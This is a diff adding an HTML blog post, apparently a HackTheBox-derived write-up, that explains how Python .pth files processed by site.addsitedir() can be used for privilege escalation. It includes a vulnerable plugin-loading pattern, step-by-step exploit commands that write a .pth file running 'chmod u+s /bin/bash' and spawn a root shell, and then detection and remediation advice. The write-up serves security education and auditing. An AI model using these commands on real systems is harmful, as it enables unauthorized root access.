@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Python .pth Privesc // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">r4hul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html">writeups</a>
+      <a href="../blog.html" class="active">blog</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a><span class="sep">/</span>
+      <a href="../blog.html">blog</a><span class="sep">/</span>
+      python-pth-privesc
+    </div>
+    <h1 style="margin-top:16px;">Python .pth Files as a Privilege Escalation Vector</h1>
+    <p style="color:var(--text-dim);margin-top:8px;font-family:var(--font-mono);font-size:0.85rem;">2026-06-28 &nbsp;·&nbsp; privesc &nbsp;·&nbsp; python &nbsp;·&nbsp; sudo</p>
+  </div>
+
+  <div class="writeup-body">
+    <p>While solving SmartHIRE on HackTheBox, I discovered a lesser-known Python privilege escalation technique involving <code>.pth</code> files and <code>site.addsitedir()</code>. Here's how it works.</p>
+
+    <h2>Background: What is site.addsitedir()?</h2>
+    <p>Python's <code>site</code> module manages where Python looks for packages. <code>site.addsitedir(path)</code> adds a directory to <code>sys.path</code> — but it does more than that. It also scans the directory for <code>.pth</code> files and processes each one.</p>
+
+    <h2>The .pth File Execution Trick</h2>
+    <p>A <code>.pth</code> file normally just lists paths to add to <code>sys.path</code>, one per line. But there's a special rule: <strong>any line beginning with <code>import</code> is executed as Python code.</strong></p>
+
+    <pre># normal.pth — just adds paths
+/home/user/.local/lib/python3.10/site-packages
+
+# evil.pth — this LINE IS EXECUTED
+import os; os.system('id')</pre>
+
+    <p>This is documented behavior, not a bug. It was designed for packages that need to run setup code. But it's a footgun when a privileged script calls <code>site.addsitedir()</code> on a user-writable directory.</p>
+
+    <h2>The Vulnerable Pattern</h2>
+    <pre>import site
+from pathlib import Path
+
+PLUGINS_DIR = Path('/opt/tools/plugins')
+
+# if ANY subdirectory here is user-writable, you have code execution as root
+for path in PLUGINS_DIR.iterdir():
+    if path.is_dir():
+        site.addsitedir(str(path))  # &lt;-- processes .pth files!</pre>
+
+    <h2>Exploitation</h2>
+    <p><strong>Step 1</strong> — Find a writable subdirectory:</p>
+    <pre>ls -la /opt/tools/plugins/
+# drwxrwxr-x 2 root devs 4096 ... dev/  &lt;-- writable!</pre>
+
+    <p><strong>Step 2</strong> — Drop the malicious .pth file:</p>
+    <pre>printf 'import os; os.system("chmod u+s /bin/bash")\n' > /opt/tools/plugins/dev/evil.pth</pre>
+
+    <p><strong>Step 3</strong> — Trigger the vulnerable script (ideally via sudo):</p>
+    <pre>sudo /usr/bin/python3.10 /opt/tools/vuln_script.py</pre>
+
+    <p><strong>Step 4</strong> — Root shell:</p>
+    <pre>/bin/bash -p
+whoami  # root</pre>
+
+    <h2>Why This Bypasses sys.path Ordering</h2>
+    <p>You might think: "what if the legitimate module directory comes before the writable one in sys.path?" With a <code>.pth</code> file, it doesn't matter. The <code>.pth</code> is executed at <code>addsitedir()</code> call time — before any <code>import</code> statements are resolved. The execution happens unconditionally.</p>
+
+    <h2>Detection</h2>
+    <p>When auditing sudo rules involving Python scripts, look for:</p>
+    <ul style="margin-left:20px;line-height:2;">
+      <li><code>site.addsitedir()</code> called on paths that are user-writable</li>
+      <li>Dynamic plugin loading patterns where the plugin directory isn't root-owned</li>
+      <li>Python scripts with <code>*</code> wildcards in sudo rules (allows arbitrary argument injection)</li>
+    </ul>
+
+    <h2>Remediation</h2>
+    <ul style="margin-left:20px;line-height:2;">
+      <li>Ensure all directories passed to <code>site.addsitedir()</code> in privileged scripts are owned by root and not writable by the running user</li>
+      <li>Prefer explicit imports over dynamic plugin loading in setuid/sudo contexts</li>
+      <li>Audit sudo rules with <code>sudo -l</code> and check every script for dynamic path manipulation</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../blog.html" class="btn btn-ghost">&larr; Back to Blog</a>
+    </div>
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    <span>r4hul</span> // HTB Writeups &amp; Security Notes
+  </div>
+</footer>
+</body>
+</html>
